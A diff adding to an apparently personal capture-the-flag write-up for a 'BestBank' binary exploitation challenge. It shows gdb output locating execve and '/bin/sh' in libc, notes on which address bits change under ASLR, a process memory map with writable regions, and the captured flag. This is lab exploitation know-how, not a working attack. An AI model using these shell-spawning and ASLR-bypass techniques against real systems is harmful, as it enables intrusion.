@@ -825,3 +825,60 @@ Breakpoint 5, 0x08049040 in printf@plt ()
    0x804921b:	push   eax
    0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
 ```
+
+```
+# Get execve address
+$ sudo gdb -p `pidof bank`
+>>> info functions execve
+...
+0xf7e8e5b0  execve
+0xf7ddd5b0  execve
+0xf7da45b0  execve
+  ^^|||^^^ these stay the same
+    ^^^ these middle bits change due to ASLR
+
+>>> info proc map
+...
+	0xf7ce5000 0xf7eba000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
+...
+	0xf7ebd000 0xf7ebe000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
+...
+>>> find 0xf7ce5000,0xf7ebe000,"/bin/sh"
+0xf7e630cf
+1 pattern found.
+>>> x/s 0xf7e630cf
+0xf7e630cf:	"/bin/sh"
+
+
+# found /bin/sh at:
+0xf7e630cf      ; now run it again. get a new ASLR address
+0xf7f350cf      ; run it again
+0xf7ecd0cf      ; 
+  ^^|||^^^ these stay the same
+    ^^^ these middle bits change due to ASLR
+```
+
+
+```
+$ cat /proc/25183/maps
+08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
+0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
+0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
+^ this section     ^ has write permissions..
+f7dae000-f7f83000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f83000-f7f84000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f84000-f7f86000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f86000-f7f87000 rwxp 001d7000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
+f7f87000-f7f8a000 rwxp 00000000 00:00 0 
+f7fa6000-f7fa8000 rwxp 00000000 00:00 0 
+f7fa8000-f7fab000 r--p 00000000 00:00 0                                  [vvar]
+f7fab000-f7fac000 r-xp 00000000 00:00 0                                  [vdso]
+f7fac000-f7fd2000 r-xp 00000000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+f7fd2000-f7fd3000 r-xp 00025000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+f7fd3000-f7fd4000 rwxp 00026000 fd:01 8130737                            /lib/i386-linux-gnu/ld-2.27.so
+ff9ed000-ffa0e000 rwxp 00000000 00:00 0                                  [stack]
+```
+
+LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}
+
+This challenge took over 7 days to complete..
